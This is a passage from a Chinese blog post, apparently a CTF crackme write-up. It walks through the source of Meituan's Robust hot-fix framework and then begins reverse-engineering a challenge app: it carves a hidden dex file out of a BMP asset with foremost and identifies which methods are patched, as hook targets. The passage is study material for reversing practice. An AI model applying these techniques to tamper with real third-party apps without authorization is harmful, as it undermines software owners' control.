<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public long getIndex()&#123;</span><br><span class="line">					return 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他会被处理成这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;在该类中声明一个接口变量changeQuickRedirect</span><br><span class="line">public static ChangeQuickRedirect changeQuickRedirect;</span><br><span class="line">&#x2F;&#x2F;在要修复的方法中添加以下逻辑代码</span><br><span class="line">    public long getIndex() &#123;</span><br><span class="line">        if(changeQuickRedirect !&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;PatchProxy中封装了获取当前className和methodName的逻辑，并在其内部最终调用了changeQuickRedirect的对应函数</span><br><span class="line">            if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) &#123;</span><br><span class="line">                return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 100L;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Robust为每个class增加了个类型为ChangeQuickRedirect的静态成员</li>
<li>每个方法前都插入了使用changeQuickRedirect相关的逻辑</li>
<li>当changeQuickRedirect不为null时，会执行到accessDispatch方法从而替换掉之前老的逻辑，达到修复的目的。</li>
</ul>
<h3 id="2-生成需要修复的类及方法的类文件并打包成dex"><a href="#2-生成需要修复的类及方法的类文件并打包成dex" class="headerlink" title="2.生成需要修复的类及方法的类文件并打包成dex"></a>2.生成需要修复的类及方法的类文件并打包成dex</h3><p>接下来你可能已经将需要修复的类及方法写好了，这个时候调用Robust的autopatch文件夹中的类及方法会生成如下主要文件：PatchesInfoImpl.java，xxxPatchControl.java（其中xxx为原类的名字）。</p>
<p>PatchesInfoImpl.java的内是由PatchesInfoFactory类的createPatchesInfoClass生成的，这是它生成PatchesInfoImpl逻辑，可以看到，这个类其实是用拼接得到的。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105175948713.png" alt="image-20210105175948713"></p>
<p>具体代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private CtClass creatxePatchesInfoClass() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">    &#x2F;&#x2F;创建PatchesInfoImpl类</span><br><span class="line">        CtClass ctPatchesInfoImpl &#x3D; classPool.makeClass(Config.patchPackageName + &quot;.PatchesInfoImpl&quot;);</span><br><span class="line">        ctPatchesInfoImpl.getClassFile().setMajorVersion(ClassFile.JAVA_7);</span><br><span class="line">        ctPatchesInfoImpl.setInterfaces(new CtClass[]&#123;classPool.get(&quot;com.meituan.robust.PatchesInfo&quot;)&#125;);</span><br><span class="line">        StringBuilder methodBody &#x3D; new StringBuilder();</span><br><span class="line">        &#x2F;&#x2F;拼接类中的内容</span><br><span class="line">        methodBody.append(&quot;public java.util.List getPatchedClassesInfo() &#123;&quot;);</span><br><span class="line">        methodBody.append(&quot;  java.util.List patchedClassesInfos &#x3D; new java.util.ArrayList();&quot;);</span><br><span class="line">        for (int i &#x3D; 0; i &lt; Config.modifiedClassNameList.size(); i++) &#123;</span><br><span class="line">            if (Constants.OBSCURE) &#123;</span><br><span class="line">                methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; &#x3D; new com.meituan.robust.PatchedClassInfo(\&quot;&quot; + ReadMapping.getInstance().getClassMappingOrDefault(Config.modifiedClassNameList.get(i)).getValueName() + &quot;\&quot;,\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf(&#39;.&#39;) + 1)) + &quot;\&quot;);&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; &#x3D; new com.meituan.robust.PatchedClassInfo(\&quot;&quot; + Config.modifiedClassNameList.get(i) + &quot;\&quot;,\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf(&#39;.&#39;) + 1)) + &quot;\&quot;);&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            methodBody.append(&quot;patchedClassesInfos.add(patchedClass&quot; + i + &quot;);&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        methodBody.append(Constants.ROBUST_UTILS_FULL_NAME + &quot;.isThrowable&#x3D;!&quot; + Config.catchReflectException + &quot;;&quot;);</span><br><span class="line">        methodBody.append(&quot;return patchedClassesInfos;\n&quot; +</span><br><span class="line">                &quot;    &#125;&quot;);</span><br><span class="line">        CtMethod m &#x3D; make(methodBody.toString(), ctPatchesInfoImpl);</span><br><span class="line">        ctPatchesInfoImpl.addMethod(m);</span><br><span class="line">        return ctPatchesInfoImpl;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        throw new RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成的PatchesInfoImpl类型及类内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class PatchesInfoImpl implements PatchesInfo &#123;</span><br><span class="line">    public List getPatchedClassesInfo() &#123;</span><br><span class="line">        List arrayList &#x3D; new ArrayList();</span><br><span class="line">        &#x2F;&#x2F;PatchedClassInfo(&quot;原来的类&quot;,&quot;修复后的类control&quot;);</span><br><span class="line">        arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;, &quot;cn.chaitin.geektan.crackme.MainActivityPatchControl&quot;));</span><br><span class="line">        arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity$1&quot;, &quot;cn.chaitin.geektan.crackme.MainActivity$1PatchControl&quot;));</span><br><span class="line">        EnhancedRobustUtils.isThrowable &#x3D; false;</span><br><span class="line">        return arrayList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外还会生成一个xxxPatchControl类，通过<code>PatchesControlFactory</code>的<code>createControlClass()</code>方法生成，具体的逻辑和生成PatchesInfoImpl类类似,其中每个Control类中都存在以下静态成员变量和方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private CtClass createControlClass(CtClass modifiedClass) throws Exception &#123;</span><br><span class="line">        CtClass patchClass &#x3D; classPool.get(NameManger.getInstance().getPatchName(modifiedClass.getName()));</span><br><span class="line">        patchClass.defrost();</span><br><span class="line">        CtClass controlClass &#x3D; classPool.getAndRename(Constants.PATCH_TEMPLATE_FULL_NAME, NameManger.getInstance().getPatchControlName(modifiedClass.getSimpleName()));</span><br><span class="line">        StringBuilder getRealParameterMethodBody &#x3D; new StringBuilder();</span><br><span class="line">        getRealParameterMethodBody.append(&quot;public Object getRealParameter(Object parameter) &#123;&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;if(parameter instanceof &quot; + modifiedClass.getName() + &quot;)&#123;&quot;);</span><br><span class="line">        getRealParameterMethodBody.</span><br><span class="line">                append(&quot;return new &quot; + patchClass.getName() + &quot;(parameter);&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;&#125;&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;return parameter;&#125;&quot;);</span><br><span class="line">        controlClass.addMethod(CtMethod.make(getRealParameterMethodBody.toString(), controlClass));</span><br><span class="line">        controlClass.getDeclaredMethod(&quot;accessDispatch&quot;).insertBefore(getAccessDispatchMethodBody(patchClass, modifiedClass.getName()));</span><br><span class="line">        controlClass.getDeclaredMethod(&quot;isSupport&quot;).insertBefore(getIsSupportMethodBody(patchClass, modifiedClass.getName()));</span><br><span class="line">        controlClass.defrost();</span><br><span class="line">        return controlClass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将含有PatchesInfoImpl.java和xxxPatchControl.java,以及xxxPatch.java（具体修复的类）打包成dex文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class xxxPatchControl implements ChangeQuickRedirect</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">public static final String MATCH_ALL_PARAMETER &#x3D; &quot;(\\w*\\.)*\\w*&quot;;</span><br><span class="line"> </span><br><span class="line">private static final Map&lt;Object, Object&gt; keyToValueRelation &#x3D; new WeakHashMap();</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;获取函数的参数的方法</span><br><span class="line">public Object getRealParameter(Object obj)&#123;..具体逻辑..&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断是否支持修复</span><br><span class="line">public boolean isSupport(String methodName, Object[] paramArrayOfObject)</span><br><span class="line">&#123;..具体逻辑.&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;执行到accessDispatch方法替换旧的类方法</span><br><span class="line">public Object accessDispatch(String methodName, Object[] paramArrayOfObject) &#123;.具体逻辑..&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;解决boolean被优化成byte的问题</span><br><span class="line">private static Object fixObj(Object booleanObj) &#123;.具体逻辑..&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-加载动态dex文件，以反射的方式修改替换旧类"><a href="#3-加载动态dex文件，以反射的方式修改替换旧类" class="headerlink" title="3.加载动态dex文件，以反射的方式修改替换旧类"></a>3.加载动态dex文件，以反射的方式修改替换旧类</h3><p>回到我们刚刚分析的地方，跟进PatchExecutor类看看。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void run() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;拉取补丁列表</span><br><span class="line">        List&lt;Patch&gt; patches &#x3D; fetchPatchList();</span><br><span class="line">        &#x2F;&#x2F;应用补丁列表</span><br><span class="line">        applyPatchList(patches);</span><br><span class="line">    &#125; catch (Throwable t) &#123;</span><br><span class="line">        Log.e(&quot;robust&quot;, &quot;PatchExecutor run&quot;, t);</span><br><span class="line">        robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor,method:run,line:36&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在run方法中，主要做了2件事。</p>
<h4 id="1-获取补丁列表"><a href="#1-获取补丁列表" class="headerlink" title="1.获取补丁列表"></a>1.获取补丁列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ist&lt;Patch&gt; patches &#x3D; fetchPatchList();</span><br><span class="line">&#x2F;&#x2F;PatchManipulateImp类的fetchPatchList方法</span><br><span class="line">protected List&lt;Patch&gt; fetchPatchList() &#123;</span><br><span class="line">        return patchManipulate.fetchPatchList(context);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-应用补丁"><a href="#2-应用补丁" class="headerlink" title="2.应用补丁"></a>2.应用补丁</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">applyPatchList(patches);</span><br><span class="line"> </span><br><span class="line">protected void applyPatchList(List&lt;Patch&gt; patches) &#123;</span><br><span class="line">       if (null &#x3D;&#x3D; patches || patches.isEmpty()) &#123;</span><br><span class="line">           return;</span><br><span class="line">       &#125;</span><br><span class="line">       Log.d(&quot;robust&quot;, &quot; patchManipulate list size is &quot; + patches.size());</span><br><span class="line">       for (Patch p : patches) &#123;</span><br><span class="line">           if (p.isAppliedSuccess()) &#123;</span><br><span class="line">               Log.d(&quot;robust&quot;, &quot;p.isAppliedSuccess() skip &quot; + p.getLocalPath());</span><br><span class="line">               continue;</span><br><span class="line">           &#125;</span><br><span class="line">           if (patchManipulate.ensurePatchExist(p)) &#123;</span><br><span class="line">               boolean currentPatchResult &#x3D; false;</span><br><span class="line">               try &#123;</span><br><span class="line">               &#x2F;&#x2F;真正应用补丁的方法patch()</span><br><span class="line">                   currentPatchResult &#x3D; patch(context, p);</span><br><span class="line">               &#125; catch (Throwable t) &#123;</span><br><span class="line">                   robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:applyPatchList line:69&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               if (currentPatchResult) &#123;</span><br><span class="line">                   &#x2F;&#x2F;设置patch 状态为成功</span><br><span class="line">                   p.setAppliedSuccess(true);</span><br><span class="line">                   &#x2F;&#x2F;统计PATCH成功率 PATCH成功</span><br><span class="line">                   robustCallBack.onPatchApplied(true, p);</span><br><span class="line"> </span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   &#x2F;&#x2F;统计PATCH成功率 PATCH失败</span><br><span class="line">                   robustCallBack.onPatchApplied(false, p);</span><br><span class="line">               &#125;</span><br><span class="line"> </span><br><span class="line">               Log.d(&quot;robust&quot;, &quot;patch LocalPath:&quot; + p.getLocalPath() + &quot;,apply result &quot; + currentPatchResult);</span><br><span class="line"> </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>跟进patch()进行分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected boolean patch(Context context, Patch patch) &#123;</span><br><span class="line">    &#x2F;&#x2F;验证patch的hash</span><br><span class="line">        if (!patchManipulate.verifyPatch(context, patch)) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;verifyPatch failure, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:107&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#x2F;&#x2F;调用DexClassLoader动态加载dex</span><br><span class="line">        DexClassLoader classLoader &#x3D; new DexClassLoader(patch.getTempPath(), context.getCacheDir().getAbsolutePath(),</span><br><span class="line">                null, PatchExecutor.class.getClassLoader());</span><br><span class="line">        patch.delete(patch.getTempPath());</span><br><span class="line"> </span><br><span class="line">        Class patchClass, oldClass;</span><br><span class="line"> </span><br><span class="line">        Class patchsInfoClass;</span><br><span class="line">        PatchesInfo patchesInfo &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">        &#x2F;&#x2F;动态加载PatchesInfoImpl，获取要patch的类</span><br><span class="line">            patchsInfoClass &#x3D; classLoader.loadClass(patch.getPatchesInfoImplClassFullName());</span><br><span class="line">            patchesInfo &#x3D; (PatchesInfo) patchsInfoClass.newInstance();</span><br><span class="line">            Log.d(&quot;robust&quot;, &quot;PatchsInfoImpl ok&quot;);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:108&quot;);</span><br><span class="line">            Log.e(&quot;robust&quot;, &quot;PatchsInfoImpl failed,cause of&quot; + t.toString());</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if (patchesInfo &#x3D;&#x3D; null) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;patchesInfo is null, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:114&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;classes need to patch</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;获取要打补丁的类patchedClasses </span><br><span class="line">        List&lt;PatchedClassInfo&gt; patchedClasses &#x3D; patchesInfo.getPatchedClassesInfo();</span><br><span class="line">        if (null &#x3D;&#x3D; patchedClasses || patchedClasses.isEmpty()) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;patchedClasses is null or empty, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:122&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">          &#x2F;&#x2F;循环类名，将patchedClasses中的类打补丁</span><br><span class="line">        for (PatchedClassInfo patchedClassInfo : patchedClasses) &#123;</span><br><span class="line">            String patchedClassName &#x3D; patchedClassInfo.patchedClassName;</span><br><span class="line">            String patchClassName &#x3D; patchedClassInfo.patchClassName;</span><br><span class="line">            if (TextUtils.isEmpty(patchedClassName) || TextUtils.isEmpty(patchClassName)) &#123;</span><br><span class="line">                robustCallBack.logNotify(&quot;patchedClasses or patchClassName is empty, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:131&quot;);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName);</span><br><span class="line">            try &#123;</span><br><span class="line">            &#x2F;&#x2F;将oldClass的changeQuickRedirectField的值设置为null</span><br><span class="line">                oldClass &#x3D; classLoader.loadClass(patchedClassName.trim());</span><br><span class="line">                Field[] fields &#x3D; oldClass.getDeclaredFields();</span><br><span class="line">                Log.d(&quot;robust&quot;, &quot;oldClass :&quot; + oldClass + &quot;     fields &quot; + fields.length);</span><br><span class="line">                Field changeQuickRedirectField &#x3D; null;</span><br><span class="line">                for (Field field : fields) &#123;</span><br><span class="line">                    if (TextUtils.equals(field.getType().getCanonicalName(), ChangeQuickRedirect.class.getCanonicalName()) &amp;&amp; TextUtils.equals(field.getDeclaringClass().getCanonicalName(), oldClass.getCanonicalName())) &#123;</span><br><span class="line">                        changeQuickRedirectField &#x3D; field;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (changeQuickRedirectField &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    robustCallBack.logNotify(&quot;changeQuickRedirectField  is null, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:147&quot;);</span><br><span class="line">                    Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; something wrong !! can  not find:ChangeQuickRedirect in&quot; + patchClassName);</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; find:ChangeQuickRedirect &quot; + patchClassName);</span><br><span class="line">                try &#123;</span><br><span class="line">             &#x2F;&#x2F;动态加载补丁类</span><br><span class="line">                    patchClass &#x3D; classLoader.loadClass(patchClassName);</span><br><span class="line">                    Object patchObject &#x3D; patchClass.newInstance();</span><br><span class="line">                    changeQuickRedirectField.setAccessible(true);</span><br><span class="line">             &#x2F;&#x2F;将它的changeQuickRedirectField设置为patchObject实例。</span><br><span class="line">                    changeQuickRedirectField.set(null, patchObject);</span><br><span class="line">                    Log.d(&quot;robust&quot;, &quot;changeQuickRedirectField set sucess &quot; + patchClassName);</span><br><span class="line">                &#125; catch (Throwable t) &#123;</span><br><span class="line">                    Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);</span><br><span class="line">                    t.printStackTrace();</span><br><span class="line">                    robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:163&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Throwable t) &#123;</span><br><span class="line">                Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);</span><br><span class="line">                t.printStackTrace();</span><br><span class="line">                robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:169&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(&quot;robust&quot;, &quot;patch finished &quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-isSupport和accessDispatch"><a href="#4-isSupport和accessDispatch" class="headerlink" title="4.isSupport和accessDispatch"></a>4.isSupport和accessDispatch</h3><p>我们再来看看onCreate()中的代码，虽然混淆后代码看起来很冗长，但是通过刚刚对Robust原理的简单分析，现在已经可以清晰的知道，这其实就是isSupport()和accessDispatch()。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void onCreate(Bundle arg13) &#123;</span><br><span class="line">        int v4 &#x3D; 3;</span><br><span class="line">        Object[] v0 &#x3D; new Object[1];</span><br><span class="line">        v0[0] &#x3D; arg13;</span><br><span class="line">        ChangeQuickRedirect v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">        Class[] v5 &#x3D; new Class[1];</span><br><span class="line">        Class v1 &#x3D; Bundle.class;</span><br><span class="line">        v5[0] &#x3D; v1;</span><br><span class="line">        Class v6 &#x3D; Void.TYPE;</span><br><span class="line">        MainActivity v1_1 &#x3D; this;</span><br><span class="line">        boolean v0_1 &#x3D; PatchProxy.isSupport(v0, v1_1, v2, false, v4, v5, v6);</span><br><span class="line">        if(v0_1) &#123;</span><br><span class="line">            v0 &#x3D; new Object[1];</span><br><span class="line">            v0[0] &#x3D; arg13;</span><br><span class="line">            v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">            v5 &#x3D; new Class[1];</span><br><span class="line">            v1 &#x3D; Bundle.class;</span><br><span class="line">            v5[0] &#x3D; v1;</span><br><span class="line">            v6 &#x3D; Void.TYPE;</span><br><span class="line">            v1_1 &#x3D; this;</span><br><span class="line">            PatchProxy.accessDispatch(v0, v1_1, v2, false, v4, v5, v6);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line"> </span><br><span class="line">           .....</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105185712828.png" alt="image-20210105185712828"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean isSupport(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) &#123;</span><br><span class="line">        &#x2F;&#x2F;Robust补丁优先执行，其他功能靠后</span><br><span class="line">        if (changeQuickRedirect &#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;不执行补丁，轮询其他监听者</span><br><span class="line">            if (registerExtensionList &#x3D;&#x3D; null || registerExtensionList.isEmpty()) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            for (RobustExtension robustExtension : registerExtensionList) &#123;</span><br><span class="line">                if (robustExtension.isSupport(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType))) &#123;</span><br><span class="line">                    robustExtensionThreadLocal.set(robustExtension);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;获取 classMethod &#x3D; className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;</span><br><span class="line">        String classMethod &#x3D; getClassMethod(isStatic, methodNumber);</span><br><span class="line">        if (TextUtils.isEmpty(classMethod)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] objects &#x3D; getObjects(paramsArray, current, isStatic);</span><br><span class="line">        try &#123;</span><br><span class="line">        &#x2F;*调用changeQuickRedirect.isSupport，还记得这个changeQuickRedirect</span><br><span class="line">        吗，他是在第3步中changeQuickRedirectField.set(null, patchObject);</span><br><span class="line">        得到的补丁类的实例。*&#x2F;</span><br><span class="line">            return changeQuickRedirect.isSupport(classMethod, objects);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的分析，可以知道只有当存在补丁的类changeQuickRedirect.isSupport()才会返回值。这个时候我们把刚刚第二步打包的dex反编译看看，我们可以看到在xxxPatchControl类中存在isSupport，它返回的值其实就是methodNumber。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean isSupport(String methodName, Object[] paramArrayOfObject) &#123;</span><br><span class="line">        return &quot;18:&quot;.contains(methodName.split(&quot;:&quot;)[3]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>accessDispatch()方法，替换原方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static Object accessDispatch(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) &#123;</span><br><span class="line"> </span><br><span class="line">       &#x2F;&#x2F;如果changeQuickRedirect为null...</span><br><span class="line">        if (changeQuickRedirect &#x3D;&#x3D; null) &#123;</span><br><span class="line">            RobustExtension robustExtension &#x3D; robustExtensionThreadLocal.get();</span><br><span class="line">            robustExtensionThreadLocal.remove();</span><br><span class="line">            if (robustExtension !&#x3D; null) &#123;</span><br><span class="line">                notify(robustExtension.describeSelfFunction());</span><br><span class="line">                return robustExtension.accessDispatch(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType));</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;同样获取 classMethod &#x3D; className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;</span><br><span class="line">        String classMethod &#x3D; getClassMethod(isStatic, methodNumber);</span><br><span class="line">        if (TextUtils.isEmpty(classMethod)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        notify(Constants.PATCH_EXECUTE);</span><br><span class="line"> </span><br><span class="line">        Object[] objects &#x3D; getObjects(paramsArray, current, isStatic);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;返回changeQuickRedirect.accessDispatch。</span><br><span class="line">        return changeQuickRedirect.accessDispatch(classMethod, objects);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>具体看看PatchControl类中的accessDispatch。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object accessDispatch(String methodName, Object[] paramArrayOfObject) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        MainActivityPatch mainActivityPatch;</span><br><span class="line">        &#x2F;&#x2F;判断classMethod的isStatic是否为false，其实在调用accessDispatch传递的就是false。</span><br><span class="line">        if (methodName.split(&quot;:&quot;)[2].equals(&quot;false&quot;)) &#123;</span><br><span class="line">            MainActivityPatch mainActivityPatch2;</span><br><span class="line">            if (keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]) &#x3D;&#x3D; null) &#123;</span><br><span class="line">                mainActivityPatch2 &#x3D; new MainActivityPatch(paramArrayOfObject[paramArrayOfObject.length - 1]);</span><br><span class="line">                keyToValueRelation.put(paramArrayOfObject[paramArrayOfObject.length - 1], null);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivityPatch2 &#x3D; (MainActivityPatch) keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]);</span><br><span class="line">            &#125;</span><br><span class="line">            mainActivityPatch &#x3D; mainActivityPatch2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            mainActivityPatch &#x3D; new MainActivityPatch(null);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;根据methodNumber，选取要执行的patch方法。</span><br><span class="line">        Object obj &#x3D; methodName.split(&quot;:&quot;)[3];</span><br><span class="line">        if (&quot;3&quot;.equals(obj)) &#123;</span><br><span class="line">            mainActivityPatch.onCreate((Bundle) paramArrayOfObject[0]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (&quot;6&quot;.equals(obj)) &#123;</span><br><span class="line">            return mainActivityPatch.Joseph(((Integer) paramArrayOfObject[0]).intValue(), ((Integer) paramArrayOfObject[1]).intValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable th) &#123;</span><br><span class="line">        th.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Robust的基本原理就是这些了</p>
<h2 id="hook点分析"><a href="#hook点分析" class="headerlink" title="hook点分析"></a>hook点分析</h2><p>我们对Robust进行分析，现在已经比较清晰的知道了我们需要攻克的难点，它是通过Robust热修复框架将一些方法热修复了，所以我们这里必须知道，它修复了哪些类及方法。</p>
<p>foremost提取assets文件夹下的GeekTan.BMP，得到dex文件直接扔到jadx中进行分析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">─$ foremost GeekTan.BMP</span><br><span class="line">foremost: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;foremost.conf: No such file or directory</span><br><span class="line">Processing: GeekTan.BMP</span><br><span class="line">|foundat&#x3D;classes.dex�,�dex</span><br><span class="line">035</span><br><span class="line">*|</span><br></pre></td></tr></table></figure>

<p>在PatchesInfoImpl类中可以看到2个要被修复的类信息。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190528663.png" alt="image-20210105190528663"></p>
<p>MainActivityPatchControl类，我们看到在accessDispatch()，onCreate()和Joseph()方法将会通过判断ethodNumber来选取。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190724026.png" alt="image-20210105190724026"></p>
<p>继续查看MainActivity$1PatchControl类，同样发现onClick被修复了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190859996.png" alt="image-20210105190859996"></p>
